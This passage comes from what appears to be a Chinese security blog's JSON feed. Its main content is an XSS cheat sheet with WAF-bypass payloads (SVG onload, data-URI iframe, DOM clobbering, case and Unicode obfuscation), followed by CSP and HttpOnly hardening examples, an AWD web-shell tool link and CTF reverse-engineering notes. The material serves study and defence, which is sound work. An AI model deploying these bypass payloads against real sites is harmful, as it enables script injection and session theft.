x[&#x27;y&#x27;].charAt=[].join;$eval(&#x27;x=alert(1)&#x27;);&#125;&#125;</span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<h5 id=\"非常规标签与协议\"><a class=\"anchor\" href=\"#非常规标签与协议\">#</a> <strong>非常规标签与协议</strong></h5>\n<ul>\n<li>\n<h6 id=\"svg-向量图形注入\"><a class=\"anchor\" href=\"#svg-向量图形注入\">#</a> <strong>SVG 向量图形注入</strong>：</h6>\n<p>html</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<h6 id=\"data-uri-协议执行\"><a class=\"anchor\" href=\"#data-uri-协议执行\">#</a> <strong>data URI 协议执行</strong>：</h6>\n<p>text</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<h5 id=\"dom-clobbering-攻击\"><a class=\"anchor\" href=\"#dom-clobbering-攻击\">#</a> <strong>DOM Clobbering 攻击</strong></h5>\n<ul>\n<li>\n<p><strong>覆盖 DOM 属性控制 JS 逻辑：</strong></p>\n<p>html</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 漏洞代码：if (window.config &amp;&amp; window.config.isAdmin) &#123;...&#125; --&gt;</span><br><span class=\"line\">&lt;a id=config&gt;&lt;/a&gt;</span><br><span class=\"line\">&lt;a id=config name=isAdmin href=admin&gt; </span><br><span class=\"line\">&lt;!-- 此时 window.config.isAdmin 为 DOM 元素而非 undefined --&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<hr />\n<h4 id=\"针对现代框架的绕过\"><a class=\"anchor\" href=\"#针对现代框架的绕过\">#</a> <strong>针对现代框架的绕过</strong></h4>\n<h5 id=\"react-jsx-注入\"><a class=\"anchor\" href=\"#react-jsx-注入\">#</a> <strong>React JSX 注入</strong></h5>\n<ul>\n<li>\n<p><strong>危险绕过  <code>dangerouslySetInnerHTML</code> </strong>：</p>\n<p>javascript</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 开发者错误使用：</span><br><span class=\"line\">&lt;div dangerouslySetInnerHTML=&#123;&#123; __html: userContent &#125;&#125; /&gt; </span><br><span class=\"line\">// 攻击：userContent = &#x27;&lt;img src=x onerror=stealData()&gt;&#x27;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p><strong>绕过  <code>&#123;expression&#125;</code>  沙箱</strong>：</p>\n<p>javascript</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 输入：userInput = &quot;javascript:alert(1)&quot;</span><br><span class=\"line\">&lt;a href=&#123;userInput&#125;&gt;Click&lt;/a&gt; &lt;!-- 触发XSS --&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<h5 id=\"vuejs-的-v-html-指令\"><a class=\"anchor\" href=\"#vuejs-的-v-html-指令\">#</a> <strong>Vue.js 的 v-html 指令</strong></h5>\n<ul>\n<li>\n<p><strong>未过滤的  <code>v-html</code> </strong>：</p>\n<p>vue</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;template&gt;</span><br><span class=\"line\">  &lt;div v-html=&quot;userContent&quot;&gt;&lt;/div&gt; &lt;!-- 直接渲染HTML --&gt;</span><br><span class=\"line\">&lt;/template&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<hr />\n<h4 id=\"绕过-waf过滤器的技巧\"><a class=\"anchor\" href=\"#绕过-waf过滤器的技巧\">#</a> <strong>绕过 WAF / 过滤器的技巧</strong></h4>\n<h5 id=\"分块拼接-fragmentation\"><a class=\"anchor\" href=\"#分块拼接-fragmentation\">#</a> <strong>分块拼接 (Fragmentation)</strong></h5>\n<ul>\n<li>\n<p><strong>拆分关键词绕过正则</strong>：</p>\n<p>javascript</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 原始：&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class=\"line\">// 变异：&lt;scr&lt;script&gt;ipt&gt;al\\u0065rt(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<h5 id=\"利用浏览器解析差异\"><a class=\"anchor\" href=\"#利用浏览器解析差异\">#</a> <strong>利用浏览器解析差异</strong></h5>\n<ul>\n<li>\n<h6 id=\"html-注释干扰\"><a class=\"anchor\" href=\"#html-注释干扰\">#</a> <strong>HTML 注释干扰</strong>：</h6>\n<p>html</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 过滤规则：删除 &lt;script&gt; 标签 --&gt;</span><br><span class=\"line\">&lt;scr&lt;!--test--&gt;ipt&gt;alert(1)&lt;/scr&lt;!--test--&gt;ipt&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<h6 id=\"无效属性混淆\"><a class=\"anchor\" href=\"#无效属性混淆\">#</a> <strong>无效属性混淆</strong>：</h6>\n<p>html</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img a=&quot;&#x27;&quot; b=&#x27;&quot;&#x27; src=x onerror=alert(1)&gt; </span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<h5 id=\"unicode-与大小写变异\"><a class=\"anchor\" href=\"#unicode-与大小写变异\">#</a> Unicode 与大小写变异</h5>\n<ul>\n<li>\n<h6 id=\"大小写混合\"><a class=\"anchor\" href=\"#大小写混合\">#</a> <strong>大小写混合</strong>：</h6>\n<p>html</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;sCriPt&gt;alert(1)&lt;/scRIPt&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<h6 id=\"unicode-转义\"><a class=\"anchor\" href=\"#unicode-转义\">#</a> <strong>Unicode 转义</strong>：</h6>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)&gt;</span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<h3 id=\"csp内容安全允许策略\"><a class=\"anchor\" href=\"#csp内容安全允许策略\">#</a> CSP (内容安全允许策略)</h3>\n<p><strong>CSP（内容安全策略）的核心目标是防止跨站脚本攻击（XSS）及其变种</strong>，它是通过<strong>严格控制网页中可以加载和执行的资源</strong>来实现的纵深防御策略。</p>\n<h4 id=\"主要防御的攻击类型\"><a class=\"anchor\" href=\"#主要防御的攻击类型\">#</a> <strong>主要防御的攻击类型</strong></h4>\n<h5 id=\"xss跨站脚本攻击\"><a class=\"anchor\" href=\"#xss跨站脚本攻击\">#</a> XSS（跨站脚本攻击）：</h5>\n<ul>\n<li><strong>传统 XSS</strong>：攻击者注入恶意脚本（如  <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> ）到网页中，当用户访问时执行。</li>\n<li><strong>CSP 的防御方式</strong>：\n<ul>\n<li>通过  <code>script-src</code>  指令限制脚本来源（如只允许同域或可信 CDN）。</li>\n<li>禁止内联脚本（如  <code>&lt;script&gt;</code>  标签或事件处理函数  <code>onclick=&quot;...&quot;</code> ），除非显式启用  <code>'unsafe-inline'</code> （不推荐）。</li>\n<li>阻止  <code>eval()</code> 、 <code>setTimeout(string)</code>  等动态代码执行。</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"数据注入攻击\"><a class=\"anchor\" href=\"#数据注入攻击\">#</a> 数据注入攻击：</h5>\n<ul>\n<li>包括未授权的  <code>&lt;iframe&gt;</code>  嵌入、恶意插件（ <code>&lt;object&gt;</code> ）、伪造表单等。</li>\n<li><strong>CSP 的防御方式</strong>：\n<ul>\n<li>通过  <code>frame-src</code>  限制嵌入框架的来源。</li>\n<li>通过  <code>object-src</code>  限制插件加载（如 Flash）。</li>\n<li>通过  <code>form-action</code>  限制表单提交的目标地址。</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"资源劫持与数据泄露\"><a class=\"anchor\" href=\"#资源劫持与数据泄露\">#</a> 资源劫持与数据泄露：</h5>\n<ul>\n<li>攻击者通过恶意脚本窃取数据（如键盘记录、截屏）或劫持用户会话。</li>\n<li><strong>CSP 的防御方式</strong>：\n<ul>\n<li>通过  <code>connect-src</code>  限制 AJAX/Fetch 请求的目标（防止数据外泄到攻击者服务器）。</li>\n<li>通过  <code>img-src</code>  限制图片来源（防止通过  <code>&lt;img&gt;</code>  标签窃取数据）。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"httponly\"><a class=\"anchor\" href=\"#httponly\">#</a> HttpOnly</h3>\n<p><strong>httponly 是 Cookie 中的一个属性，可以用来防止客户端脚本通过 document.cookie 属性访问 Cookie</strong>，保护 Cookie 不被跨站脚本攻击窃取或篡改</p>\n<p>使用方法通用格式如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=/; Domain=example.com; Expires=&lt;date&gt;; Secure; HttpOnly</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"不同服务器端语言框架的示例\"><a class=\"anchor\" href=\"#不同服务器端语言框架的示例\">#</a> 不同服务器端语言 / 框架的示例</h4>\n<h5 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> PHP</h5>\n<p>使用  <code>session_set_cookie_params</code>  (在  <code>session_start()</code>  之前调用) 为会话 Cookie 设置：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">session_set_cookie_params([</span><br><span class=\"line\">    &#x27;lifetime&#x27; =&gt; 86400, // 生存期（秒）</span><br><span class=\"line\">    &#x27;path&#x27; =&gt; &#x27;/&#x27;,</span><br><span class=\"line\">    &#x27;domain&#x27; =&gt; &#x27;example.com&#x27;,</span><br><span class=\"line\">    &#x27;secure&#x27; =&gt; true,    // 推荐在 HTTPS 站点启用</span><br><span class=\"line\">    &#x27;httponly&#x27; =&gt; true   // 关键！开启 HttpOnly</span><br><span class=\"line\">]);</span><br><span class=\"line\">session_start();</span><br></pre></td></tr></table></figure></p>\n<p>使用  <code>setcookie</code>  函数设置普通 Cookie</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setcookie(</span><br><span class=\"line\">    &#x27;MyCookie&#x27;,         // Cookie 名称</span><br><span class=\"line\">    &#x27;cookie_value&#x27;,     // Cookie 值</span><br><span class=\"line\">    time() + 3600,      // 过期时间（时间戳）</span><br><span class=\"line\">    &#x27;/&#x27;,                // 路径</span><br><span class=\"line\">    &#x27;example.com&#x27;,      // 域名</span><br><span class=\"line\">    true,               // Secure (仅 HTTPS)</span><br><span class=\"line\">    true                // HttpOnly (关键！)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"java\"><a class=\"anchor\" href=\"#java\">#</a> java</h5>\n<p>使用  <code>HttpServletResponse.addCookie</code> ：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie myCookie = new Cookie(&quot;MyCookie&quot;, &quot;cookie_value&quot;);</span><br><span class=\"line\">myCookie.setMaxAge(3600); // 秒</span><br><span class=\"line\">myCookie.setPath(&quot;/&quot;);</span><br><span class=\"line\">myCookie.setDomain(&quot;example.com&quot;);</span><br><span class=\"line\">myCookie.setSecure(true);  // 推荐在 HTTPS 站点启用</span><br><span class=\"line\">myCookie.setHttpOnly(true); // 关键！开启 HttpOnly</span><br><span class=\"line\">response.addCookie(myCookie);</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> python</h5>\n<p>Django 默认将会话 Cookie 和 CSRF Cookie 设置为  <code>HttpOnly</code> 。如果需要手动设置</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">response = HttpResponse(&quot;Setting cookie&quot;)</span><br><span class=\"line\">response.set_cookie(</span><br><span class=\"line\">    &#x27;MyCookie&#x27;,</span><br><span class=\"line\">    value=&#x27;cookie_value&#x27;,</span><br><span class=\"line\">    max_age=3600,</span><br><span class=\"line\">    path=&#x27;/&#x27;,</span><br><span class=\"line\">    domain=&#x27;example.com&#x27;,</span><br><span class=\"line\">    secure=True,       # 推荐在 HTTPS 站点启用</span><br><span class=\"line\">    httponly=True      # 关键！开启 HttpOnly</span><br><span class=\"line\">)</span><br><span class=\"line\">return response</span><br></pre></td></tr></table></figure></p>\n<p>在  <code>settings.py</code>  中配置会话 Cookie (默认已开启)：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SESSION_COOKIE_HTTPONLY = True  # 默认即为 True</span><br><span class=\"line\">SESSION_COOKIE_SECURE = True    # 生产环境推荐设为 True</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"web-服务器配置-nginx-apache\"><a class=\"anchor\" href=\"#web-服务器配置-nginx-apache\">#</a> <strong>Web 服务器配置 (Nginx / Apache):</strong></h5>\n<p>有时也可以在 Web 服务器层统一添加或修改 Cookie 属性（例如修改后端应用设置的 Cookie）</p>\n<h6 id=\"nginx\"><a class=\"anchor\" href=\"#nginx\">#</a> nginx</h6>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 修改通过代理传递的 Cookie (例如将后端设置的会话Cookie添加HttpOnly/Secure)</span><br><span class=\"line\">location / &#123;</span><br><span class=\"line\">    proxy_pass http://backend;</span><br><span class=\"line\">    proxy_cookie_path / &quot;/; Secure; HttpOnly&quot;; # 添加属性</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"apache2\"><a class=\"anchor\" href=\"#apache2\">#</a> apache2</h6>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 为匹配的 Cookie 添加 HttpOnly 和 Secure 属性 (需谨慎)</span><br><span class=\"line\">Header edit Set-Cookie ^(.*)$ &quot;$1; Secure; HttpOnly&quot;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"aspnet-c\"><a class=\"anchor\" href=\"#aspnet-c\">#</a> <strong><span class=\"exturl\" data-url=\"aHR0cDovL0FTUC5ORVQ=\">ASP.NET</span> (C#):</strong></h5>\n<p>在  <code>web.config</code>  中配置会话 Cookie：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;system.web&gt;</span><br><span class=\"line\">  &lt;httpCookies httpOnlyCookies=&quot;true&quot; requireSSL=&quot;true&quot; /&gt; &lt;!-- 全局设置 --&gt;</span><br><span class=\"line\">  &lt;sessionState cookieHttpOnly=&quot;true&quot; /&gt; &lt;!-- 会话 Cookie --&gt;</span><br><span class=\"line\">&lt;/system.web&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h4>\n<p>开启  <code>HttpOnly</code>  就是在服务器端创建 Cookie 时（通过  <code>Set-Cookie</code>  响应头），明确添加  <code>HttpOnly</code>  标志。查看你使用的服务器端语言或框架的文档，找到设置 Cookie 属性的方法（通常是  <code>httpOnly</code> ,  <code>httponly</code> ,  <code>setHttpOnly</code>  这样的参数），将其设置为  <code>true</code>  即可。最后务必通过浏览器开发者工具验证设置是否成功</p>\n<p><code>httponly</code>  属性通过禁止 JavaScript 访问特定 Cookie，切断了恶意脚本（通常来自 XSS 攻击）窃取或篡改该 Cookie 的途径，从而有效地保护了 Cookie 中存储的敏感信息（尤其是会话令牌），防止了基于 Cookie 窃取的会话劫持攻击。它是 Web 应用安全纵深防御体系中一个简单而至关重要的环节</p>\n",
            "tags": []
        },
        {
            "id": "https://lookhui.github.io/%E5%B0%8F%E5%B7%A5%E5%85%B7/",
            "url": "https://lookhui.github.io/%E5%B0%8F%E5%B7%A5%E5%85%B7/",
            "title": "小工具",
            "date_published": "2024-03-09T12:25:51.000Z",
            "content_html": "<h3 id=\"写的一个关于awd的小工具里面包含的模块有web上传不死马-web-pwn批量一键获取flag\"><a class=\"anchor\" href=\"#写的一个关于awd的小工具里面包含的模块有web上传不死马-web-pwn批量一键获取flag\">#</a> 写的一个关于 awd 的小工具，里面包含的模块有 web 上传不死马、web pwn 批量一键获取 flag</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">工具链接：https://github.com/lookhui/awdtools</span><br></pre></td></tr></table></figure></p>\n",
            "tags": []
        },
        {
            "id": "https://lookhui.github.io/%E8%B0%88%E8%B0%88%E6%88%91%E5%AF%B9%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E4%B8%8E%E8%AF%84%E4%BC%B0%E8%B5%9B%E9%A1%B9%E7%9A%84%E7%9C%8B%E6%B3%95/",
            "url": "https://lookhui.github.io/%E8%B0%88%E8%B0%88%E6%88%91%E5%AF%B9%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E4%B8%8E%E8%AF%84%E4%BC%B0%E8%B5%9B%E9%A1%B9%E7%9A%84%E7%9C%8B%E6%B3%95/",
            "title": "2024开始的打击",
            "date_published": "2024-01-07T08:18:58.000Z",
            "content_html": "<h1 id=\"谈谈我对信息安全管理与评估赛项的看法\"><a class=\"anchor\" href=\"#谈谈我对信息安全管理与评估赛项的看法\">#</a> 谈谈我对信息安全管理与评估赛项的看法</h1>\n<p>针对这个比赛真的一言难尽，这个比赛的第三阶段让我看清了自己真的很弱，这个比赛的电脑都是主办方提供包括工具，里面不允许有网上的需要付费软件也就是说他的 ida 并不是 pro 而是免费版无法 f5 但是比赛方会给另外一个能够查看到伪代码的工具。我使用的时候发现 pwn 题有时需要动态调试里面提供了 pwndbg 但是无法使用，应该是需要安装，我真的很好奇到底怎么玩这个 pwn 题目啊。</p>\n<p>并且 23 年开始增加了理论题目，主办方并不会给你这个理论题目的答案，并且都不会给你理论题的选项，让选手们都没有学习的方向，但是他们的队伍和他们的合作院校是能够在 100 分的理论在 10 分钟内达到满分的状态。</p>\n<p>第一个 pwn 题很离谱没有缓冲区 nc 连接进去没有办法和本地环境一样，很离谱啊，然后第二个 pwn 题是一个 uaf 也就是 free 释放后并没有清空内容。</p>\n<p>这个比赛我的建议是你学校是主办方或者你的学校是主办方的合作院校就可以去拿一等奖，如果并不是的话可以去学习学习混个二等奖。</p>\n<p>这次虽然是一次很难受的打击但是也让我学习到了很多东西，让我明白的很多。</p>\n<p>如果对这个比赛还有想法的，还觉得自己能拿第一的可以来找我要比赛环境</p>\n",
            "tags": [
                "记录贴"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-reverse/",
            "url": "https://lookhui.github.io/HTB-reverse/",
            "title": "HTB-reverse",
            "date_published": "2023-12-20T07:56:46.000Z",
            "content_html": "<h3 id=\"behind-the-scenes\"><a class=\"anchor\" href=\"#behind-the-scenes\">#</a> Behind the Scenes</h3>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ida打开后能看到HTB&#123;%S%S&#125;标识，直接找到带入即可</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"simple-encryptor\"><a class=\"anchor\" href=\"#simple-encryptor\">#</a> Simple Encryptor</h3>\n<p>这个的话主要看前面那个代码然后本地分析，需要注意的是这个要在 linux 运行才能对</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int read_file(char *name, char **buff)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    FILE *file;</span><br><span class=\"line\">    int sz;</span><br><span class=\"line\"></span><br><span class=\"line\">    file = fopen(name, &quot;rb&quot;);</span><br><span class=\"line\">    fseek(file, 0, SEEK_END);</span><br><span class=\"line\">    sz = ftell(file);</span><br><span class=\"line\">    rewind(file);</span><br><span class=\"line\">    *buff = (char *)calloc(sz + 1, 1);</span><br><span class=\"line\">    fread(*buff, 1, sz, file);</span><br><span class=\"line\">    fclose(file);</span><br><span class=\"line\"></span><br><span class=\"line\">    return sz;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char *buff;</span><br><span class=\"line\">    int i, r1, r2, size;</span><br><span class=\"line\"></span><br><span class=\"line\">    size = read_file(&quot;flag.enc&quot;, &amp;buff);</span><br><span class=\"line\"></span><br><span class=\"line\">    r1 = *(int *)buff;</span><br><span class=\"line\">    srand(r1);</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;, r1);</span><br><span class=\"line\">    for (i = 4; i &lt; size; ++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        r1 = rand();</span><br><span class=\"line\">        r2 = rand() &amp; 7;</span><br><span class=\"line\">        buff[i] = (buff[i] &lt;&lt; (8 - r2)) | ((unsigned char)buff[i] &gt;&gt; r2);</span><br><span class=\"line\">        buff[i] ^= r1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(&quot;%s\\n&quot;, &amp;buff[4]);</span><br><span class=\"line\"></span><br><span class=\"line\">    free(buff);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "HTB"
            ]
        },
        {
            "id": "https://lookhui.github.io/MOBILE%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "url": "https://lookhui.github.io/MOBILE%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "title": "MOBILE刷题记录",
            "date_published": "2023-12-19T12:27:44.000Z",
            "content_html": "<h4 id=\"ciscn-2022-东北crackme_android\"><a class=\"anchor\" href=\"#ciscn-2022-东北crackme_android\">#</a> [CISCN 2022 东北] crackme_Android</h4>\n<p>安卓逆向使用 jadx 来转</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public boolean check(CharSequence flag) &#123;</span><br><span class=\"line\">       if (flag.length() == 38 &amp;&amp; flag.subSequence(0, 5).toString().equals(&quot;flag&#123;&quot;) &amp;&amp; flag.charAt(flag.length() - 1) == &#x27;&#125;&#x27;) &#123;</span><br><span class=\"line\">           CharSequence data = flag.subSequence(5, flag.length() - 1);</span><br><span class=\"line\">           StringBuilder sumval = new StringBuilder();</span><br><span class=\"line\">           for (int i = 0; i &lt; data.length(); i += 4) &#123;</span><br><span class=\"line\">               sumval.append(md5(data.subSequence(i, i + 4).toString()));</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">           return sumval.toString().equals(&quot;8393931a16db5a00f464a24abe24b17a9040b57d9cb2cbfa6bdc61d12e9b51f2789e8a8ae9406c969118e75e9bc65c4327fbc7c3accdf2c54675b0ddf3e0a6099b1b81046d525495e3a14ff6eae76eddfa1740cd6bd483da0f7684b2e4ec84b371f07bf95f0113eefab12552181dd832af8d1eb220186400c494db7091e402b0&quot;);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       return false;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   /* JADX INFO: Access modifiers changed from: protected */</span><br><span class=\"line\">   @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br><span class=\"line\">   public void onCreate(Bundle savedInstanceState) &#123;</span><br><span class=\"line\">       super.onCreate(savedInstanceState);</span><br><span class=\"line\">       setContentView(R.layout.activity_main);</span><br><span class=\"line\">       Button button = (Button) findViewById(R.id.button);</span><br><span class=\"line\">       final EditText flagInput = (EditText) findViewById(R.id.flagInput);</span><br><span class=\"line\">       button.setOnClickListener(new View.OnClickListener() &#123; // from class: com.example.crackme1.MainActivity.1</span><br><span class=\"line\">           @Override // android.view.View.OnClickListener</span><br><span class=\"line\">           public void onClick(View view) &#123;</span><br><span class=\"line\">               CharSequence flag = flagInput.getText();</span><br><span class=\"line\">               if (MainActivity.this.check(flag)) &#123;</span><br><span class=\"line\">                   Toast.makeText(MainActivity.this, &quot;Right!&quot;, 0).show();</span><br><span class=\"line\">               &#125; else &#123;</span><br><span class=\"line\">                   Toast.makeText(MainActivity.this, &quot;Wrong!&quot;, 